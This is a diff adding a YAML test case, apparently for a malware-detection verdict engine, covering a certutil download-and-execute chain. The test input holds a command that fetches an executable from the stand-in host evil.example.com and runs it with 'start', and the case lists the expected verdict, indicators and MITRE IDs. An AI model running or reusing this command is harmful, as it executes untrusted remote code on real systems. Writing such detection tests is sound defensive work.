@@ -1,0 +1,45 @@
+id: T14_certutil_start_chain
+title: Malicious — certutil download + cmd `start` execution chain
+provenance: analyst-submitted sample (2026-08-01) · LOLBin download-and-execute
+input: 'certutil.exe -urlcache -split -f http://evil.example.com/a.exe C:\Users\Public\a.exe && start C:\Users\Public\a.exe'
+expected_verdict: malicious
+must_fire_intents:
+  - staging
+  - remote_execution
+must_not_fire:
+  - persistence
+  - credential_access
+forbidden_words_in_verdict:
+  - ransomware
+  - cobalt strike
+  - campaign
+  - APT
+  - family
+must_admit_unknown: false
+expected_confidence_band: high
+expected_iocs:
+  - {kind: url,    value: 'http://evil.example.com/a.exe'}
+  - {kind: domain, value: 'evil.example.com'}
+  - {kind: file,   value: 'C:\Users\Public\a.exe'}
+  - {kind: file,   value: 'a.exe'}
+expected_mitre:
+  - T1105
+  - T1204.002
+expected_behaviors:
+  - remote source
+  - staging
+  - downloads executable
+  - writes executable
+  - executes downloaded
+expected_evidence:
+  - certutil
+  - chain:certutil
+min_recommendations: 2
+notes: >
+  LOLBin variant of the download-and-execute chain: certutil is
+  abused as a downloader (T1105) and the cmd `start` builtin executes
+  the dropped binary. The Verdict Engine must correlate the two
+  behaviours regardless of the specific downloader / executor and
+  escalate to MALICIOUS. Behaviour rows must include the analyst-
+  friendly narrative (Downloads → Writes → Executes) — no specific
+  malware family may be attributed without evidence.
